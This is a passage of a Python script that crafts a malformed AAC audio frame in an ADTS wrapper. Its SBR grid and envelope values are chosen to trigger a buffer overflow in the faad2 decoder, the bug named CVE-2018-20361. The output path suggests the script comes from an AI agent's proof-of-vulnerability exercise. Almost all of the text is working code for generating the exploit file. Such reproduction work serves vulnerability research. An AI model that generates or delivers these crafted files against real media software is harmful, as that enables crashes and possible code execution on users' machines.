# gain_control_data_present\n    \n    # ID_FIL (Fill element for SBR) - 3 bits\n    write_bits(bit_buffer, 0b110, 3)\n    \n    # Extension size\n    write_bits(bit_buffer, 15, 4)\n    write_bits(bit_buffer, 80, 8)  # esc_count\n    \n    # SBR extension\n    write_bits(bit_buffer, 0x02, 4)  # extension type\n    \n    # SBR data\n    write_bits(bit_buffer, 0, 2)  # bs_extension_id\n    write_bits(bit_buffer, 1, 1)  # bs_header_flag (header present)\n    \n    # SBR header\n    write_bits(bit_buffer, 1, 1)  # bs_amp_res\n    write_bits(bit_buffer, 6, 4)  # bs_start_freq\n    write_bits(bit_buffer, 9, 4)  # bs_stop_freq\n    write_bits(bit_buffer, 2, 3)  # bs_xover_band\n    write_bits(bit_buffer, 0, 2)  # bs_reserved\n    write_bits(bit_buffer, 0, 1)  # bs_header_extra_1\n    \n    # sbr_data\n    write_bits(bit_buffer, 0, 1)  # bs_data_extra\n    \n    # sbr_single_channel_element\n    write_bits(bit_buffer, 0, 1)  # bs_data_extra\n    \n    # sbr_grid - FIXVAR with maximum borders to trigger overflow\n    write_bits(bit_buffer, 0b01, 2)  # bs_frame_class = FIXVAR\n    \n    # bs_abs_bord = 3 (max 2-bit value)\n    # This gives abs_bord_trail = numTimeSlots + 3 = 16 + 3 = 19\n    # With rate=2: t_E[last] = 2 * 19 = 38\n    # If tHFAdj=2 or more: 38+2=40 (boundary) or 38+3=41 (overflow)\n    write_bits(bit_buffer, 3, 2)\n    \n    # bs_num_env = 3 (2 bits, +1 = 4 envelopes)\n    write_bits(bit_buffer, 3, 2)\n    \n    # bs_rel_bord for 3 relative borders (num_env - 1)\n    # Each value is 2 bits, formula: 2*value + 2\n    # Use max values to push boundaries further\n    for i in range(3):\n        write_bits(bit_buffer, 3, 2)  # 2*3+2 = 8\n    \n    # bs_pointer - log2(4+1) = log2(5) = 3 bits\n    write_bits(bit_buffer, 0, 3)\n    \n    # bs_freq_res for 4 envelopes\n    for i in range(4):\n        write_bits(bit_buffer, 1, 1)\n    \n    # sbr_dtdf - direction for 4 envelopes\n    for i in range(4):\n        write_bits(bit_buffer, 0, 1)\n    \n    # sbr_invf - inverse filtering (2 bands typical)\n    write_bits(bit_buffer, 1, 2)\n    write_bits(bit_buffer, 1, 2)\n    \n    # sbr_envelope - envelope scalefactors\n    for env in range(4):\n        for band in range(8):\n            write_bits(bit_buffer, 0b110, 3)\n    \n    # sbr_noise - noise floor scalefactors\n    for noise in range(2):\n        for band in range(4):\n            write_bits(bit_buffer, 0b10, 2)\n    \n    # Padding for remaining extension data\n    while len(bit_buffer) < 94 * 8:\n        write_bits(bit_buffer, 0, 8)\n    \n    # ID_END\n    write_bits(bit_buffer, 0b111, 3)\n    \n    return bits_to_bytes(bit_buffer)\n\ndef create_adts_frame(aac_data):\n    """Wrap AAC data in ADTS header"""\n    # ADTS header (7 bytes for ADTS without CRC)\n    frame_length = len(aac_data) + 7\n    \n    adts = bytearray()\n    # Syncword (12 bits) = 0xFFF\n    adts.append(0xFF)\n    adts.append(0xF1)  # 0xF1 = 11110001 (ID=0 MPEG-4, layer=00, protection_absent=1)\n    \n    # profile (2 bits) = 01 (AAC LC)\n    # sampling_frequency_index (4 bits) = 0100 (44100 Hz)\n    # private_bit (1 bit) = 0\n    # channel_configuration (3 bits, split) = 001 (1 channel, first bit)\n    adts.append(0x50)  # 01010000\n    \n    # channel_configuration (2 bits continued) = 01\n    # original/copy (1 bit) = 0\n    # home (1 bit) = 0\n    # copyright_identification_bit (1 bit) = 0\n    # copyright_identification_start (1 bit) = 0\n    # frame_length (2 bits, upper) = frame_length >> 11\n    adts.append(0x40 | ((frame_length >> 11) & 0x03))\n    \n    # frame_length (8 bits, middle)\n    adts.append((frame_length >> 3) & 0xFF)\n    \n    # frame_length (3 bits, lower)\n    # buffer_fullness (5 bits, upper) = 0x1F (VBR)\n    adts.append(((frame_length & 0x07) << 5) | 0x1F)\n    \n    # buffer_fullness (6 bits, lower) = 0x3F\n    # number_of_raw_data_blocks_in_frame (2 bits) = 00\n    adts.append(0xFC)\n    \n    return bytes(adts) + aac_data\n\n# Generate test case\noutput_path = "/home/ubuntu/PoV/DrillAgent/workspace-sonnet/faad2.cve-2018-20361/round2/testcase-round2"\n\naac_frame = create_aac_frame_with_sbr()\nadts_frame = create_adts_frame(aac_frame)\n\nwith open(output_path, "wb") as f:\n    f.write(adts_frame)\n\nprint(f"Generated test case: {output_path}")\nprint(f"Size: {len(adts_frame)} bytes")\n'}
